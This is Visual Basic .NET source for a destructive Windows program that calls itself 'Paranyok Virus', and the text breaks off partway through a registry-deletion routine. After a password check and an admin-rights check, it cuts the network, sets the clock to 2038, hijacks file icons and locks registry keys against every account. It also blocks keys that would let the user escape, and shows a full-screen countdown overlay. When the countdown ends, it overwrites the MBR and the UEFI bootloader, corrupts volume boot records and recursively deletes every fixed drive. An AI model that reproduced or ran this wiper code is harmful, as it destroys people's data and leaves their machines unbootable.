Imports System.Drawing.Drawing2D
Imports System.IO
Imports Microsoft.Win32
Imports System.Security.AccessControl
Imports System.Security.Principal
Imports System.Runtime.InteropServices
Imports System.Media
Imports System.Drawing.Imaging
Imports System.Management
Imports System.Threading
Imports System.Timers
Imports System.Reflection
Imports System.Text

Public Class Form1
    Inherits Form

    ' Interface elements
    Private label As New Label()
    Private textBox As New TextBox()
    Private runButton As New Button()
    Private exitButton As New Button()
    Private panelTop As New Panel()
    Private panelBottom As New Panel()
    Private paranyokImage As Image
    Private fullScreenOverlay As FullScreenOverlay
    ' Specify the type directly to avoid ambiguity
    Private animationTimer As New Windows.Forms.Timer()
    Private WithEvents VisualEffectTimer As New Windows.Forms.Timer()

    ' Constants for keyboard hook
    Private Const WH_KEYBOARD_LL As Integer = 13
    Private Const WM_KEYDOWN As Integer = &H100
    Private Const VK_LWIN As Integer = &H5B
    Private Const VK_RWIN As Integer = &H5C

    ' Hook handle and callback delegate
    Private hookID As IntPtr = IntPtr.Zero
    Private hookCallbackDelegate As HookProc

    ' Delegate for hook callback
    Private Delegate Function HookProc(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr

    Private Function HookCallback(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
        If nCode >= 0 AndAlso wParam = CType(WM_KEYDOWN, IntPtr) Then
            Dim vkCode As Integer = Marshal.ReadInt32(lParam)
            ' Ignore Windows key presses
            If vkCode = VK_LWIN Or vkCode = VK_RWIN Then
                Return CType(1, IntPtr) ' Prevent the key from being processed
            End If
        End If
        Return CallNextHookEx(hookID, nCode, wParam, lParam)
    End Function

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            ' Load the PARANYOK image from resources
            Dim wallpaperBytes As Byte() = My.Resources.Resource1.PARANYOK
            paranyokImage = ByteArrayToImage(wallpaperBytes)

            ' Form settings
            Me.Text = "Paranyok Virus Interface"
            Me.Size = New Size(600, 400)
            Me.FormBorderStyle = FormBorderStyle.None
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.BackColor = Color.FromArgb(35, 35, 35)

            ' Top Panel (acts as a custom header with gradient background)
            panelTop.Size = New Size(Me.Width, 80)
            panelTop.Location = New Point(0, 0)
            AddHandler panelTop.Paint, AddressOf DrawTopPanel
            Me.Controls.Add(panelTop)

            ' Bottom Panel (acts as a footer)
            panelBottom.Size = New Size(Me.Width, 50)
            panelBottom.Location = New Point(0, Me.Height - 50)
            panelBottom.BackColor = Color.FromArgb(50, 50, 50)
            Me.Controls.Add(panelBottom)

            ' Label settings
            label.Text = "Enter the key to run the virus:"
            label.ForeColor = Color.White
            label.Font = New Font("Segoe UI", 14, FontStyle.Bold)
            label.Location = New Point(100, 120)
            label.Size = New Size(400, 30)
            Me.Controls.Add(label)

            ' TextBox settings (centered)
            textBox.Location = New Point(100, 170)
            textBox.Size = New Size(400, 30)
            textBox.Font = New Font("Segoe UI", 12)
            textBox.BackColor = Color.FromArgb(40, 40, 40)
            textBox.ForeColor = Color.White
            textBox.BorderStyle = BorderStyle.FixedSingle
            Me.Controls.Add(textBox)

            ' Run Button settings (centered and stylish)
            runButton.Text = "Run Virus"
            runButton.Location = New Point(200, 230)
            runButton.Size = New Size(200, 50)
            runButton.Font = New Font("Segoe UI", 12, FontStyle.Bold)
            runButton.BackColor = Color.FromArgb(80, 80, 80)
            runButton.ForeColor = Color.White
            runButton.FlatStyle = FlatStyle.Flat
            runButton.FlatAppearance.BorderColor = Color.White
            runButton.Cursor = Cursors.Hand
            AddHandler runButton.Click, AddressOf RunButton_Click
            Me.Controls.Add(runButton)

            ' Exit Button (larger and centered in footer)
            exitButton.Text = "Exit"
            exitButton.Size = New Size(120, 50)  ' Adjust size
            exitButton.Font = New Font("Segoe UI", 12, FontStyle.Bold)
            exitButton.BackColor = Color.Red
            exitButton.ForeColor = Color.White
            exitButton.FlatStyle = FlatStyle.Flat
            exitButton.Cursor = Cursors.Hand
            AddHandler exitButton.Click, Sub(senderObj, ev) Me.Close()

            ' Position Exit Button at the center of the bottom panel
            exitButton.Location = New Point((panelBottom.Width - exitButton.Width) \ 2, (panelBottom.Height - exitButton.Height) \ 2)
            panelBottom.Controls.Add(exitButton)

            ' Timer for animation effects
            animationTimer.Interval = 100
            AddHandler animationTimer.Tick, AddressOf AnimationTimer_Tick

            ' Timer for sound effect simulation
            VisualEffectTimer.Interval = 500  ' Adjust as needed
            AddHandler VisualEffectTimer.Tick, AddressOf VisualFlash_Tick

            ' Disable Alt + F4 (window close button)
            Me.FormBorderStyle = FormBorderStyle.None
            Me.StartPosition = FormStartPosition.CenterScreen

            ' Set up the low-level keyboard hook
            hookCallbackDelegate = New HookProc(AddressOf HookCallback)
            hookID = SetHook(hookCallbackDelegate)
        Catch ex As Exception
            MessageBox.Show("An error occurred during initialization: " & ex.Message, "Initialization Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Protected Overrides Sub OnFormClosed(e As FormClosedEventArgs)
    End Sub

    ' Windows API declarations
    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function GetModuleHandle(lpModuleName As String) As IntPtr
    End Function

    ' Import SystemParametersInfo function to set wallpaper
    <DllImport("user32.dll", CharSet:=CharSet.Auto)>
    Private Shared Function SystemParametersInfo(uAction As UInteger, uParam As UInteger, lpvParam As String, fuWinIni As UInteger) As Boolean
    End Function

    <DllImport("user32.dll")>
    Private Shared Function SetWindowsHookEx(idHook As Integer, lpfn As HookProc, hMod As IntPtr, dwThreadId As UInteger) As IntPtr
    End Function

    <DllImport("user32.dll")>
    Private Shared Function UnhookWindowsHookEx(hhk As IntPtr) As Boolean
    End Function

    <DllImport("user32.dll")>
    Private Shared Function CallNextHookEx(hhk As IntPtr, nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
    End Function

    ' Constants for SystemParametersInfo
    Private Const SPI_SETDESKWALLPAPER As UInteger = 20
    Private Const SPIF_UPDATEINIFILE As UInteger = 1
    Private Const SPIF_SENDCHANGE As UInteger = 2

    ' Method to set wallpaper, update file icon appearance, and lock registry keys
    Private Sub SetWallpaperAndLockRegistry()
        Try
            ' Path to the wallpaper image
            Dim wallpaperPath As String = Path.Combine(Path.GetTempPath(), "PARANYOK.png")

            ' Save the image to a temporary file
            SaveImageToFile(paranyokImage, wallpaperPath)

            ' Set the wallpaper
            If Not SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaperPath, SPIF_UPDATEINIFILE Or SPIF_SENDCHANGE) Then
                MessageBox.Show("Failed to set wallpaper.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Return
            End If

            ' Update file icon appearance
            UpdateAllFileIcons()

            ' Lock the registry keys related to wallpaper settings
            LockWallpaperRegistryKeys()

        Catch ex As Exception
            MessageBox.Show("An error occurred while setting the wallpaper: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Method to update the appearance of all file icons to use the executable's icon
    Private Sub UpdateAllFileIcons()
        Try
            ' Get the path to the current executable
            Dim executablePath As String = Assembly.GetExecutingAssembly().Location
            Dim iconPath As String = $"""{executablePath}"",0"

            ' Registry keys for DefaultIcon in HKEY_CLASSES_ROOT (including themefile)
            Dim regKeys As String() = {
            "txtfile\DefaultIcon",
            "exefile\DefaultIcon",
            "mp3file\DefaultIcon",
            "mp4file\DefaultIcon",
            "themefile\DefaultIcon"
        }

            ' Update DefaultIcon for each key in HKEY_CLASSES_ROOT
            For Each regKey In regKeys
                UpdateRegistryKey(Registry.ClassesRoot, regKey, iconPath)
            Next

        Catch ex As Exception
            MessageBox.Show("An error occurred while updating file icons: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Private Sub UpdateRegistryKey(baseHive As RegistryKey, subKey As String, value As String)
        Try
            ' Get the path to the parent key and the value name
            Dim lastIndex As Integer = subKey.LastIndexOf("\")
            If lastIndex = -1 Then Return ' Exit if there is no valid subkey structure

            Dim keyPath As String = subKey.Substring(0, lastIndex)
            Dim valueName As String = subKey.Substring(lastIndex + 1)

            ' Try to open the parent key with write access
            Using key As RegistryKey = baseHive.OpenSubKey(keyPath, True)
                If key Is Nothing Then
                    ' The key does not exist, so attempt to create it
                    Using newKey As RegistryKey = baseHive.CreateSubKey(keyPath, True)
                        ' Set the value for the new subkey
                        newKey.SetValue(valueName, value, RegistryValueKind.String)
                    End Using
                Else
                    ' Key exists, setting the value
                    key.SetValue(valueName, value, RegistryValueKind.String)
                End If
            End Using

            ' Lock the registry key path
            LockRegistryKey(keyPath)

        Catch ex As Exception
            ' Silently catch any exceptions to avoid displaying error messages
            ' The errors are ignored to prevent interruptions in the process
        End Try
    End Sub

    ' Helper method to save an image to a file
    Private Sub SaveImageToFile(image As Image, filePath As String)
        Using fs As New FileStream(filePath, FileMode.Create, FileAccess.Write)
            image.Save(fs, Imaging.ImageFormat.Png)
        End Using
    End Sub

    ' Lock registry keys related to wallpaper settings
    Private Sub LockWallpaperRegistryKeys()
        Try
            ' Registry path for wallpaper settings
            Dim keyPath As String = "Control Panel\Desktop"

            ' Lock the registry key to restrict access
            LockRegistryKey(keyPath)

        Catch ex As Exception
            MessageBox.Show("An error occurred while locking Desktop registry hive.: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Set up the low-level keyboard hook
    Private Function SetHook(proc As HookProc) As IntPtr
        Using curProc As Process = Process.GetCurrentProcess()
            Using curModule As ProcessModule = curProc.MainModule
                Return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(Nothing), 0)
            End Using
        End Using
    End Function

    ' Method to draw the top panel with a gradient
    Private Sub DrawTopPanel(sender As Object, e As PaintEventArgs)
        Dim g As Graphics = e.Graphics
        Dim gradientBrush As New LinearGradientBrush(panelTop.ClientRectangle, Color.FromArgb(50, 50, 50), Color.FromArgb(80, 80, 80), 90)
        g.FillRectangle(gradientBrush, panelTop.ClientRectangle)

        ' Add header text
        Dim headerFont As New Font("Segoe UI", 16, FontStyle.Bold)
        g.DrawString("Paranyok Virus Launcher", headerFont, Brushes.White, New PointF(150, 20))
    End Sub

    ' Button click logic (Key validation section)
    Private Sub RunButton_Click(sender As Object, e As EventArgs)
        Dim key As String = textBox.Text
        Dim correctKey As String = "ParanyokBuradanKacisYok"

        If key = correctKey Then
            ' Check if the application is running with administrator privileges
            If Not IsAdministrator() Then
                MessageBox.Show("This application must be run as Administrator to execute the virus.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Return
            End If

            ' Check if Secure Boot is enabled
            If IsSecureBootEnabled() Then
                MessageBox.Show("Secure Boot is enabled. The virus cannot be executed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                Return
            End If

            MessageBox.Show("Key accepted! Running virus...", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)

            ' Start animation effect and simulate sound effect
            animationTimer.Start()
            VisualEffectTimer.Start()

            ' Launch full-screen GDI effects
            If fullScreenOverlay Is Nothing OrElse fullScreenOverlay.IsDisposed Then
                fullScreenOverlay = New FullScreenOverlay()
                AddHandler fullScreenOverlay.FormClosed, AddressOf OnOverlayFormClosed
                fullScreenOverlay.Show()
            End If

            ' 1. Disconnect the Internet
            DisconnectInternet()

            ' 2. Set the system time to 2038
            SetSystemTimeTo2038()

            ' Update registry settings and disable Log off
            UpdateRegistrySettings()
            DisableLogoffAndLockRegistry()
            SetWallpaperAndLockRegistry()
        Else
            MessageBox.Show("Wrong key! The virus could not be executed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub

    ' Disconnect the Internet by disabling all network adapters
    Private Sub DisconnectInternet()
        Try
            Dim networkManagement As New ManagementClass("Win32_NetworkAdapter")
            Dim networkAdapters As ManagementObjectCollection = networkManagement.GetInstances()

            For Each adapter As ManagementObject In networkAdapters
                If CBool(adapter("NetEnabled")) Then
                    ' Disable the network adapter
                    adapter.InvokeMethod("Disable", Nothing)
                    Console.WriteLine($"Disabled adapter: {adapter("Name")}")
                End If
            Next
        Catch ex As Exception
            MessageBox.Show("Failed to disable network adapters: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Set system time to January 19, 2038
    Private Sub SetSystemTimeTo2038()
        Try
            Dim newDateTime As New SYSTEMTIME With {
                .wYear = 2038,
                .wMonth = 1,
                .wDay = 19,
                .wHour = 3,
                .wMinute = 14,
                .wSecond = 7
            }

            ' Set system time using WinAPI
            If Not SetLocalTime(newDateTime) Then
                Throw New ComponentModel.Win32Exception(Marshal.GetLastWin32Error())
            End If
        Catch ex As Exception
            MessageBox.Show("Failed to set system time: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Declare the SYSTEMTIME structure for setting the date
    <StructLayout(LayoutKind.Sequential)>
    Private Structure SYSTEMTIME
        Public wYear As UShort
        Public wMonth As UShort
        Public wDayOfWeek As UShort
        Public wDay As UShort
        Public wHour As UShort
        Public wMinute As UShort
        Public wSecond As UShort
        Public wMilliseconds As UShort
    End Structure

    ' Declare the SetLocalTime API function
    <DllImport("kernel32.dll", SetLastError:=True)>
    Private Shared Function SetLocalTime(ByRef time As SYSTEMTIME) As Boolean
    End Function

    ' Check if the application is running with administrator privileges
    Private Function IsAdministrator() As Boolean
        Dim identity = WindowsIdentity.GetCurrent()
        Dim principal = New WindowsPrincipal(identity)
        Return principal.IsInRole(WindowsBuiltInRole.Administrator)
    End Function

    Private Function IsSecureBootEnabled() As Boolean
        Try
            ' Define the PowerShell command to check Secure Boot status
            Dim command As String = "powershell -Command ""Confirm-SecureBootUEFI"""

            ' Create a new process to run the PowerShell command
            Dim process As New Process()
            process.StartInfo.FileName = "cmd.exe"
            process.StartInfo.Arguments = "/c " & command
            process.StartInfo.UseShellExecute = False
            process.StartInfo.RedirectStandardOutput = True
            process.StartInfo.RedirectStandardError = True
            process.StartInfo.CreateNoWindow = True

            ' Start the process and read the output
            process.Start()
            Dim output As String = process.StandardOutput.ReadToEnd()
            process.WaitForExit()

            ' Process the output
            Return output.Contains("True")

        Catch ex As Exception
            MessageBox.Show("Error checking Secure Boot status: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try

        Return False
    End Function

    Public Sub DisableLogoffAndLockRegistry()
        ' Registry path
        Dim regPath As String = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"

        Try
            ' Open or create the registry key
            Using regKey As RegistryKey = Registry.CurrentUser.CreateSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree)
                ' Set NoLogoff key to 1 (disable Logoff) if regKey is not null
                regKey?.SetValue("NoLogoff", 1, RegistryValueKind.DWord)
            End Using

            ' Lock the registry key to restrict access
            LockRegistryKey(regPath)

        Catch ex As Exception
            MessageBox.Show("An error occurred while disabling Log Off: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Update registry settings
    Private Sub UpdateRegistrySettings()
        Try
            ' Change the EnableLUA key
            Dim regKeyPath As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            Using regKey As RegistryKey = Registry.LocalMachine.OpenSubKey(regKeyPath, True)
                ' Set EnableLUA key to 1 if regKey is not null
                regKey?.SetValue("EnableLUA", 1, RegistryValueKind.DWord)
            End Using

            ' Lock the registry key
            LockRegistryKey(regKeyPath)

        Catch ex As Exception
            MessageBox.Show("An error occurred while updating UAC: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Private Sub LockRegistryKey(keyPath As String)
        Try
            ' Open the registry key with permission to change security
            Using key As RegistryKey = Registry.LocalMachine.OpenSubKey(keyPath, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.ChangePermissions)
                If key IsNot Nothing Then
                    ' Get the current security settings
                    Dim security As RegistrySecurity = key.GetAccessControl()

                    ' Remove all access to the key
                    Dim everyone As New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing)
                    Dim system As New SecurityIdentifier(WellKnownSidType.LocalSystemSid, Nothing)
                    Dim admins As New SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, Nothing)

                    ' Purge existing access rules
                    security.PurgeAccessRules(everyone)
                    security.PurgeAccessRules(system)
                    security.PurgeAccessRules(admins)

                    ' Remove all access rights for everyone, system, and admins
                    security.AddAccessRule(New RegistryAccessRule(everyone, RegistryRights.FullControl, AccessControlType.Deny))
                    security.AddAccessRule(New RegistryAccessRule(system, RegistryRights.FullControl, AccessControlType.Deny))
                    security.AddAccessRule(New RegistryAccessRule(admins, RegistryRights.FullControl, AccessControlType.Deny))

                    ' Apply the changes to the registry key
                    key.SetAccessControl(security)
                End If
            End Using

        Catch ex As Exception
            MessageBox.Show("An error occurred while lock: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Event handler for FullScreenOverlay form closure
    Private Sub OnOverlayFormClosed(sender As Object, e As EventArgs)
        fullScreenOverlay = Nothing
    End Sub

    ' Timer Tick event handler for animation effects
    Private Sub AnimationTimer_Tick(sender As Object, e As EventArgs)
        ' Create a blur effect by drawing semi-transparent rectangles
        Dim g As Graphics = Me.CreateGraphics()
        Dim blurBrush As New SolidBrush(Color.FromArgb(50, Color.Black))

        For i As Integer = 0 To 10
            Dim offset As Integer = i * 5
            g.FillRectangle(blurBrush, 0 - offset, 0 - offset, Me.Width + offset * 2, Me.Height + offset * 2)
        Next

        ' Draw the PARANYOK image
        If paranyokImage IsNot Nothing Then
            Dim x As Integer = Me.ClientSize.Width \ 2 - paranyokImage.Width \ 2
            Dim y As Integer = Me.ClientSize.Height \ 2 - paranyokImage.Height \ 2
            g.DrawImage(paranyokImage, x, y)
        End If

        ' Delay to create a smooth effect
        Thread.Sleep(50)
    End Sub

    ' Timer Tick event handler for simulating visual flash effects
    Private Sub VisualFlash_Tick(sender As Object, e As EventArgs)
        ' Simulate visual flash effect by flashing the screen with different colors
        Dim g As Graphics = Me.CreateGraphics()
        Dim random As New Random()
        Dim flashColor As Color = Color.FromArgb(random.Next(256), random.Next(256), random.Next(256))
        Dim flashBrush As New SolidBrush(flashColor)

        g.FillRectangle(flashBrush, Me.ClientRectangle)
        Thread.Sleep(50)
        Me.Invalidate() ' Clear the flash effect
    End Sub

    ' Convert Byte Array to Image
    Private Function ByteArrayToImage(byteArray As Byte()) As Image
        Using ms As New MemoryStream(byteArray)
            Return Image.FromStream(ms)
        End Using
    End Function

    ' Override WndProc to disable Alt + F4
    Protected Overrides Sub WndProc(ByRef m As Message)
        Const WM_SYSCOMMAND As Integer = &H112
        Const SC_CLOSE As Integer = &HF060

        If m.Msg = WM_SYSCOMMAND AndAlso m.WParam.ToInt32() = SC_CLOSE Then
            ' Ignore Alt + F4
            Return
        End If

        MyBase.WndProc(m)
    End Sub

    ' Override ProcessCmdKey to handle specific keys
    Protected Overrides Function ProcessCmdKey(ByRef msg As Message, keyData As Keys) As Boolean
        ' Prevent specific key combinations
        If keyData = (Keys.Control Or Keys.Delete) Then
            Return True
        End If

        Return MyBase.ProcessCmdKey(msg, keyData)
    End Function

End Class

Public Class AudioPlayer
    Private ReadOnly soundPlayer As New SoundPlayer()
    Private ReadOnly wavStream As MemoryStream

    Public Sub New()
        ' Extract the WAV byte array from resources
        Dim wavBytes As Byte() = My.Resources.Resource1.paranyokaudio

        ' Use MemoryStream to play the WAV
        wavStream = New MemoryStream(wavBytes)
        ' Load the WAV file into the SoundPlayer
        soundPlayer.Stream = wavStream
    End Sub

    ' Method to play the audio
    Public Sub PlayAudio()
        soundPlayer.Play()
    End Sub

End Class

Public Class FullScreenOverlay
    Inherits Form

    Private ReadOnly animationTimer As New Windows.Forms.Timer()
    Private ReadOnly random As New Random()
    Private ReadOnly blurEffect As New GaussianBlur()
    Private ReadOnly bloodEffect As New BloodGoesDownEffect(Me)
    Private ReadOnly timerLabel As New Label()
    Private ReadOnly audioPlayer As New AudioPlayer()
    Private countdownTime As Integer = 60 ' Countdown timer in seconds
    Private portalEffectPhase As Single = 0.0F ' Phase for wavy distortion

    ' Initialize the full-screen overlay form
    Public Sub New()
        Me.FormBorderStyle = FormBorderStyle.None
        Me.Bounds = Screen.PrimaryScreen.Bounds ' Set form to full-screen
        Me.TopMost = True
        Me.BackColor = Color.Black
        Me.Opacity = 0.7 ' Transparency setting

        ' Initialize and display the timer label
        timerLabel.AutoSize = True
        timerLabel.ForeColor = Color.White
        timerLabel.Font = New Font("Segoe UI", 20, FontStyle.Bold)
        timerLabel.Location = New Point(10, 10) ' Position of the timer on the screen
        Me.Controls.Add(timerLabel)

        ' Initialize and start audio
        audioPlayer.PlayAudio()

        ' Start the timer
        animationTimer.Interval = 1000 ' Timer triggers every second
        AddHandler animationTimer.Tick, AddressOf AnimationTimer_Tick
        animationTimer.Start()
    End Sub

    ' This method contains the destructive payloads
    Public Sub RunDestructivePayloads()
        Dim destructivePayload As New DestructivePayloads()
        destructivePayload.Execute()
    End Sub

    ' Timer tick function, applies effects and updates countdown timer
    Private Sub AnimationTimer_Tick(sender As Object, e As EventArgs)
        Try
            Dim g As Graphics = Me.CreateGraphics()
            g.SmoothingMode = SmoothingMode.None

            ' Draw portal effect first
            ApplyPortalEffect(g)

            ' Apply Gaussian blur effect
            blurEffect.ApplyBlur(g, Me.ClientSize)

            ' Apply blood effect
            bloodEffect.Apply(g)

            ' Update the countdown timer label
            If countdownTime > 0 Then
                countdownTime -= 1
                timerLabel.Text = "Remaining Time: " & countdownTime.ToString() & " seconds"
            Else
                ' When countdown finishes, run destructive payloads and update label
                timerLabel.Text = "Time's up! PARANYOK IS EVERYWHERE!"
                RunDestructivePayloads()
            End If

        Catch ex As Exception
            MessageBox.Show("An error occurred during animation: " & ex.Message, "Animation Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Apply Minecraft Nether portal-like effect with pixelated swirling distortion
    Private Sub ApplyPortalEffect(g As Graphics)
        Dim gridSize As Integer = 20 ' Size of each pixelated "block"
        portalEffectPhase += 0.05F ' Increment phase for wavy distortion

        For y As Integer = 0 To Me.Height Step gridSize
            For x As Integer = 0 To Me.Width Step gridSize
                ' Calculate distorted positions using sine wave (for swirling effect)
                Dim distortedX As Integer = x + CInt(Math.Sin((y + portalEffectPhase) / 30.0F) * 10)
                Dim distortedY As Integer = y + CInt(Math.Sin((x + portalEffectPhase) / 30.0F) * 10)

                ' Create random purple color shades for the portal
                Dim colorIntensity As Integer = random.Next(128, 256)
                Dim portalColor As Color = Color.FromArgb(colorIntensity, 128, 0, 128)

                ' Draw a small "block" for each grid position with the distorted coordinates
                g.FillRectangle(New SolidBrush(portalColor), distortedX, distortedY, gridSize, gridSize)
            Next
        Next
    End Sub

    ' Prevent form from closing
    Protected Overrides Sub OnFormClosing(e As FormClosingEventArgs)
        e.Cancel = True
    End Sub

    ' Disable Alt + F4
    Protected Overrides Sub WndProc(ByRef m As Message)
        Const WM_SYSCOMMAND As Integer = &H112
        Const SC_CLOSE As Integer = &HF060

        If m.Msg = WM_SYSCOMMAND AndAlso m.WParam.ToInt32() = SC_CLOSE Then
            ' Ignore Alt + F4
            Return
        End If

        MyBase.WndProc(m)
    End Sub
End Class

' Gaussian Blur Effect
Public Class GaussianBlur
    Public Sub ApplyBlur(g As Graphics, size As Size)
        Using blur As New Bitmap(size.Width, size.Height)
            Using blurGraphics As Graphics = Graphics.FromImage(blur)
                blurGraphics.Clear(Color.Transparent)

                ' Use a semi-transparent brush to create blur effect
                Using blurBrush As New SolidBrush(Color.FromArgb(128, Color.White))
                    blurGraphics.FillRectangle(blurBrush, New Rectangle(0, 0, size.Width, size.Height))
                End Using

                ' ImageAttributes and ColorMatrix for blur intensity
                Using imageAttributes As New ImageAttributes()
                    Dim colorMatrix As New ColorMatrix() With {
                        .Matrix33 = 0.5F ' Blur intensity
                    }
                    imageAttributes.SetColorMatrix(colorMatrix, ColorMatrixFlag.Default, ColorAdjustType.Bitmap)

                    ' Draw the blurred image on the provided Graphics object
                    g.DrawImage(blur, New Rectangle(0, 0, size.Width, size.Height), 0, 0, size.Width, size.Height, GraphicsUnit.Pixel, imageAttributes)
                End Using
            End Using
        End Using
    End Sub
End Class

' Custom structure to hold blood drop data
Public Structure BloodDrop
    Public Rect As Rectangle
    Public Alpha As Integer
    Public VelocityX As Integer
    Public VelocityY As Integer

    Public Sub New(rect As Rectangle, alpha As Integer, velocityX As Integer, velocityY As Integer)
        Me.Rect = rect
        Me.Alpha = alpha
        Me.VelocityX = velocityX
        Me.VelocityY = velocityY
    End Sub
End Structure

' Enhanced Blood Drops Effect
Public Class BloodGoesDownEffect
    Private ReadOnly form As Form
    Private ReadOnly random As New Random()
    Private WithEvents AnimationTimer As New Timers.Timer() ' Specify the Timer class

    ' Store the blood trail with color intensity for fading and movement
    Private ReadOnly bloodTrail As New List(Of BloodDrop)

    Public Sub New(form As Form)
        Me.form = form

        ' Setup the timer for movement
        AnimationTimer.Interval = 50 ' Adjust for smoother motion if needed
        AnimationTimer.Start()
    End Sub

    Public Sub Apply(g As Graphics)
        ' Draw previous blood trail with fading effect
        For Each trailDrop In bloodTrail
            ' Use color with transparency based on trailDrop's alpha value for fading effect
            Dim fadedBrush As New SolidBrush(Color.FromArgb(trailDrop.Alpha, 255, 0, 0))
            g.FillEllipse(fadedBrush, trailDrop.Rect)
        Next

        ' Update the trail: Move the blood drops
        For i As Integer = 0 To bloodTrail.Count - 1
            Dim updatedDrop = bloodTrail(i)
            updatedDrop.Rect.X += updatedDrop.VelocityX
            updatedDrop.Rect.Y += updatedDrop.VelocityY

            ' If the blood drop goes out of bounds, reset its position randomly
            If updatedDrop.Rect.Y > form.Height OrElse updatedDrop.Rect.X > form.Width OrElse updatedDrop.Rect.X < 0 Then
                updatedDrop = CreateRandomBloodDrop()
            End If

            ' Reduce alpha for fading effect
            updatedDrop.Alpha = Math.Max(updatedDrop.Alpha - 5, 0)
            bloodTrail(i) = updatedDrop
        Next

        ' Remove fully transparent blood drops from the trail
        bloodTrail.RemoveAll(Function(trail) trail.Alpha = 0)

        ' Add a new blood drop at random positions
        bloodTrail.Add(CreateRandomBloodDrop())
    End Sub

    ' Create a random blood drop with random position, size, and velocity
    Private Function CreateRandomBloodDrop() As BloodDrop
        Dim bloodDropSize As Integer = random.Next(20, 50)
        Dim randomX As Integer = random.Next(0, form.Width)
        Dim randomY As Integer = random.Next(0, form.Height)
        Dim velocityX As Integer = random.Next(-3, 4) ' Random horizontal velocity
        Dim velocityY As Integer = random.Next(2, 6) ' Random downward velocity

        Return New BloodDrop(New Rectangle(randomX, randomY, bloodDropSize, bloodDropSize), 255, velocityX, velocityY)
    End Function

    ' Handle the timer elapsed event (example implementation)
    Private Sub AnimationTimer_Elapsed(sender As Object, e As ElapsedEventArgs) Handles AnimationTimer.Elapsed
        form.Invalidate() ' Refresh the form to trigger a redraw
    End Sub
End Class

Public Class DestructivePayloads

    ' Entry method to trigger all destructive actions
    Public Sub Execute()

        ' 1. Write message to Notepad
        WriteMessageToNotepad()

        ' 2. Grant permissions to self
        GrantSelfPermissions()

        ' 3. Apply access restrictions
        ApplyAccessRestrictions()

        ' Write the byte arrays to temporary files
        File.WriteAllBytes(tempMbrPath, mbrResource)

        ' 4. Write MBR using paranyokmbr from Resource1
        WriteMBR(tempMbrPath, "\\.\PhysicalDrive0")

        ' 5. Write UEFI using bootmgfw from Resource1
        ReplaceBootx64WithBootmgfw()

        ' 6. Corrupt All VBR's
        CorruptAllVBRS()

        ' 7. Corrupt All Registry and Lock in a separate thread
        Dim deleteThread As New Thread(AddressOf DeleteRegistryKeysAndLock)
        deleteThread.Start()
        Try
            ' Get all logical drives
            Dim drives As DriveInfo() = DriveInfo.GetDrives()

            ' Loop through each drive
            For Each drive As DriveInfo In drives
                If drive.IsReady AndAlso drive.DriveType = DriveType.Fixed Then ' Only target fixed drives
                    Dim driveLetter As String = drive.RootDirectory.FullName

                    ' Execute the rd command for the current drive letter
                    ExecuteDeleteCommand(driveLetter)
                End If
            Next
        Catch ex As Exception
            MessageBox.Show("An error occurred while executing the payload: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try

    End Sub

    ' Extract the string from Resource1
    ReadOnly mbrResourceString As String = My.Resources.Resource1.paranyokmbr

    ' Convert the string to a byte array
    ReadOnly mbrResource As Byte() = Encoding.UTF8.GetBytes(mbrResourceString)

    ' Define temporary file paths
    ReadOnly tempMbrPath As String = Path.Combine(Path.GetTempPath(), "paranyok.bin")

    Private Sub ExecuteDeleteCommand(driveLetter As String)
        Try
            ' Prepare the destructive rd command
            Dim command As String = "rd " & driveLetter & " /s /q"

            ' Start a new process to run the command
            Dim processInfo As New ProcessStartInfo With {
            .FileName = "cmd.exe",
            .Arguments = "/c " & command,
            .RedirectStandardOutput = True,
            .UseShellExecute = False,
            .CreateNoWindow = True
            }

            ' Execute the command
            Using process As Process = Process.Start(processInfo)
                process.WaitForExit()
            End Using
        Catch ex As Exception
            MessageBox.Show("Failed to execute delete command on drive " & driveLetter & ": " & ex.Message, "Execution Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Private Sub DeleteRegistryKeysAndLock()
        Try
            ' Define the registry paths to delete
            Dim registryPaths As String() = {
            "HKEY_CLASSES_ROOT",
            "HKEY_CURRENT_USER",
            "HKEY_LOCAL_MACHINE",
            "HKEY_USERS",
            "HKEY_CURRENT_CONFIG"
        }

            ' Delete all keys under each specified hive
            For Each path In registryPaths
